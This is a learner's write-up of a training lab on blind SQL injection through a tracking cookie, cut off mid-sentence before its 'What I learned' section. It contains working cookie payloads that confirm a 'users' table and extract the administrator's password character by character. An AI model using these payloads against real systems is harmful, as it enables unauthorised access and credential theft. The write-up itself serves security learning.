---
topic: SQL injection
level: Apprentice
time_spent: 2 hours
date: 24th Nov,2026
---

**Vulnerability:** 

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

**Payload:**
```
Cookie: TrackingId=sp6noqfqdKnsOAvQ; session=gRAlBYLyISNtGfILsTEgbL9CnCydI2Zg
TrackingId=sp6noqfqdKnsOAvQ' AND (SELECT 'a' FROM users LIMIT 1) = 'a'--; session=gRAlBYLyISNtGfILsTEgbL9CnCydI2Zg
```

- This gave the result that the 'Welcome back' message is a boolean so we can use it as an indicator to confirm things with the 'Welcome back' message displaying or not. With this query we can confirm that the 'users' table exists.
![](Blind%20SQL%20injection%20with%20conditional%20responses.md_Attachments/-20261124.png)


![](Blind%20SQL%20injection%20with%20conditional%20responses.md_Attachments/-20261124-1.png)

```
Cookie: TrackingId=sp6noqfqdKnsOAvQ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator') = 'a'--; session=gRAlBYLyISNtGfILsTEgbL9CnCydI2Zg
```

- Used this query to compare the first letter of the password with 'a' and we can do this for all the letters one by one but that is an 

**What I learned:**